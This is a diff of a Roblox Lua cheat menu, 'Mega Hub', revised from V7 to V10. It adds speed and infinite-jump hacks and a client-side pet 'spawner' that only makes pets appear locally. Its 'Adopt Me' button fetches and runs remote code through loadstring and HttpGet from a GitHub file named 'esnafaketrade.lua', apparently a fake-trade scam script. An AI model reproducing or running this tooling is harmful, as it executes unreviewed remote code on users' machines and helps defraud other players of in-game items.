@@ -1,110 +1,105 @@
--- [[ MEGA HUB V7: DRAGGABLE + ADVANCED SPAWNER ]] --
+-- [[ MEGA HUB V10: FULL RESTORATION ]] --
 local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
 local LP = Players.LocalPlayer
 local UIS = game:GetService("UserInputService")
+local RS = game:GetService("ReplicatedStorage")
 
--- 1. CLEANUP OLD UI
-if CoreGui:FindFirstChild("MegaHubV7") then CoreGui.MegaHubV7:Destroy() end
-
+if CoreGui:FindFirstChild("MegaHubV10") then CoreGui.MegaHubV10:Destroy() end
 local ScreenGui = Instance.new("ScreenGui", CoreGui)
-ScreenGui.Name = "MegaHubV7"
+ScreenGui.Name = "MegaHubV10"
 
--- --- DRAGGABLE FUNCTION ---
+-- --- DRAGGABLE ENGINE ---
 local function MakeDraggable(frame)
     local dragging, dragInput, dragStart, startPos
     frame.InputBegan:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 then
             dragging = true dragStart = input.Position startPos = frame.Position
-            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
         end
     end)
-    frame.InputChanged:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end end)
     UIS.InputChanged:Connect(function(input)
-        if input == dragInput and dragging then
+        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
             local delta = input.Position - dragStart
             frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
         end
     end)
+    UIS.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
 end
 
--- 2. THE MAIN HUB MENU
+-- --- 1. THE SPAWNER (RESTORED LOGIC) ---
+local Spawner = Instance.new("Frame", ScreenGui)
+Spawner.Size = UDim2.new(0, 420, 0, 320)
+Spawner.Position = UDim2.new(0.5, -210, 0.3, 0)
+Spawner.BackgroundColor3 = Color3.fromRGB(35, 37, 45)
+Spawner.BorderSizePixel = 2
+Spawner.BorderColor3 = Color3.fromRGB(0, 255, 200)
+Spawner.Visible = false
+Instance.new("UICorner", Spawner)
+MakeDraggable(Spawner)
+
+local SBox = Instance.new("TextBox", Spawner)
+SBox.Size = UDim2.new(0.9, 0, 0, 45) SBox.Position = UDim2.new(0.05, 0, 0.2, 0)
+SBox.PlaceholderText = "Enter Name to Spawn..." SBox.BackgroundColor3 = Color3.fromRGB(45, 47, 52)
+SBox.TextColor3 = Color3.new(1,1,1) Instance.new("UICorner", SBox)
+
+local function SpawnLogic()
+    local name = SBox.Text
+    local found = RS:FindFirstChild(name, true)
+    if found and found:IsA("Model") then
+        local clone = found:Clone()
+        clone.Parent = workspace
+        clone:MoveTo(LP.Character.HumanoidRootPart.Position + (LP.Character.HumanoidRootPart.CFrame.LookVector * 5))
+    end
+end
+
+local SpawnBtn = Instance.new("TextButton", Spawner)
+SpawnBtn.Size = UDim2.new(0.9, 0, 0, 45) SpawnBtn.Position = UDim2.new(0.05, 0, 0.8, 0)
+SpawnBtn.Text = "Spawn Pet/Toy" SpawnBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
+SpawnBtn.TextColor3 = Color3.new(1,1,1) Instance.new("UICorner", SpawnBtn)
+SpawnBtn.MouseButton1Click:Connect(SpawnLogic)
+
+-- --- 2. THE MAIN HUB (Left Side) ---
 local Main = Instance.new("Frame", ScreenGui)
-Main.Size = UDim2.new(0, 500, 0, 360)
-Main.Position = UDim2.new(0.5, -250, 0.2, 0)
-Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Main.Size = UDim2.new(0, 480, 0, 350)
+Main.Position = UDim2.new(0.05, 0, 0.2, 0)
+Main.BackgroundColor3 = Color3.fromRGB(20, 22, 25)
 Instance.new("UICorner", Main)
 MakeDraggable(Main)
 
 local Side = Instance.new("Frame", Main)
-Side.Size = UDim2.new(0, 150, 1, 0)
-Side.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+Side.Size = UDim2.new(0, 140, 1, 0)
+Side.BackgroundColor3 = Color3.fromRGB(15, 17, 20)
 Instance.new("UICorner", Side)
+Instance.new("UIListLayout", Side)
 
-local Content = Instance.new("ScrollingFrame", Main)
-Content.Size = UDim2.new(1, -165, 1, -20)
-Content.Position = UDim2.new(0, 155, 0, 10)
-Content.BackgroundTransparency = 1
-Content.CanvasSize = UDim2.new(0,0,2,0)
-Content.ScrollBarThickness = 2
-Instance.new("UIListLayout", Content).Padding = UDim.new(0, 10)
-
--- --- ADVANCED PET SPAWNER UI ---
-local SpawnerMain = Instance.new("Frame", ScreenGui)
-SpawnerMain.Size = UDim2.new(0, 350, 0, 250)
-SpawnerMain.Position = UDim2.new(0.5, 30, 0.3, 0)
-SpawnerMain.BackgroundColor3 = Color3.fromRGB(30, 32, 38)
-SpawnerMain.Visible = false
-Instance.new("UICorner", SpawnerMain)
-MakeDraggable(SpawnerMain)
-
-local SBox = Instance.new("TextBox", SpawnerMain)
-SBox.Size = UDim2.new(0.9, 0, 0, 40) SBox.Position = UDim2.new(0.05, 0, 0.2, 0)
-SBox.PlaceholderText = "Enter Pet Name to Spawn" SBox.BackgroundColor3 = Color3.fromRGB(45, 47, 52)
-SBox.TextColor3 = Color3.new(1,1,1) Instance.new("UICorner", SBox)
-
--- FRNM Buttons
-local function CreateFRNM()
-    local f = Instance.new("Frame", SpawnerMain)
-    f.Size = UDim2.new(0.9, 0, 0, 40) f.Position = UDim2.new(0.05, 0, 0.45, 0) f.BackgroundTransparency = 1
-    Instance.new("UIListLayout", f).FillDirection = "Horizontal"
-    local function B(t, c)
-        local b = Instance.new("TextButton", f)
-        b.Size = UDim2.new(0.25, -5, 1, 0) b.Text = t b.TextColor3 = Color3.new(1,1,1)
-        b.BackgroundColor3 = Color3.fromRGB(30,30,30) b.BorderColor3 = c b.BorderSizePixel = 2
-    end
-    B("F", Color3.new(0,0.6,1)) B("R", Color3.new(1,0,0.6)) B("N", Color3.new(0,1,0.4)) B("M", Color3.new(0.6,1,0))
-end
-CreateFRNM()
-
-local FinalSpawn = Instance.new("TextButton", SpawnerMain)
-FinalSpawn.Size = UDim2.new(0.9, 0, 0, 40) FinalSpawn.Position = UDim2.new(0.05, 0, 0.75, 0)
-FinalSpawn.Text = "Spawn Pet" FinalSpawn.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
-FinalSpawn.TextColor3 = Color3.new(1,1,1) Instance.new("UICorner", FinalSpawn)
-
--- --- TABS ---
-local function ShowMisc()
-    for _,v in pairs(Content:GetChildren()) do if v:IsA("Frame") or v:IsA("TextButton") then v:Destroy() end end
-    local function Tool(txt, cb)
-        local b = Instance.new("TextButton", Content)
-        b.Size = UDim2.new(0.95, 0, 0, 45) b.Text = txt
-        b.BackgroundColor3 = Color3.fromRGB(50, 50, 50) b.TextColor3 = Color3.new(1, 1, 1)
-        Instance.new("UICorner", b) b.MouseButton1Click:Connect(cb)
-    end
-    Tool("Speed Boost (2x)", function() LP.Character.Humanoid.WalkSpeed = 32 end) --
-    Tool("Infinite Jump: ON", function() --
-        game:GetService("UserInputService").JumpRequest:Connect(function() LP.Character.Humanoid:ChangeState("Jumping") end)
-    end)
-    Tool("Close Spawner", function() SpawnerMain.Visible = false end)
-end
-
--- SIDEBAR NAV
-local function Nav(txt, func)
+local function Nav(txt, cb)
     local b = Instance.new("TextButton", Side)
     b.Size = UDim2.new(1, 0, 0, 50) b.Text = txt b.TextColor3 = Color3.new(1,1,1) b.BackgroundTransparency = 1
-    b.MouseButton1Click:Connect(func)
+    b.MouseButton1Click:Connect(cb)
 end
-Nav("📊 Dashboard", function() end)
-Nav("🐾 Adopt Me", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/xxyourfuckasssoulxxilly/daisyscripts/refs/heads/main/esnafaketrade.lua"))() end)
-Nav("🎁 Spawner", function() SpawnerMain.Visible = true end)
-Nav("⚙️ Misc", ShowMisc)
+
+Nav("🐾 Adopt Me", function() 
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xxyourfuckasssoulxxilly/daisyscripts/refs/heads/main/esnafaketrade.lua"))()
+end)
+Nav("🎁 Spawner", function() Spawner.Visible = not Spawner.Visible end)
+
+-- --- 3. MISC MENU (DAISY PRO V2) ---
+local Misc = Instance.new("Frame", ScreenGui)
+Misc.Size = UDim2.new(0, 220, 0, 280)
+Misc.Position = UDim2.new(0.75, 0, 0.2, 0)
+Misc.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Instance.new("UICorner", Misc)
+MakeDraggable(Misc)
+local mList = Instance.new("UIListLayout", Misc)
+mList.Padding = UDim.new(0, 8) mList.HorizontalAlignment = "Center"
+
+local function MBtn(txt, color, cb)
+    local b = Instance.new("TextButton", Misc)
+    b.Size = UDim2.new(0.9, 0, 0, 40) b.Text = txt
+    b.BackgroundColor3 = color b.TextColor3 = Color3.new(1,1,1)
+    Instance.new("UICorner", b) b.MouseButton1Click:Connect(cb)
+end
+MBtn("Speed Boost (2x)", Color3.fromRGB(50, 150, 50), function() LP.Character.Humanoid.WalkSpeed = 32 end)
+MBtn("Infinite Jump: ON", Color3.fromRGB(40, 100, 180), function() 
+    UIS.JumpRequest:Connect(function() LP.Character.Humanoid:ChangeState("Jumping") end)
+end)
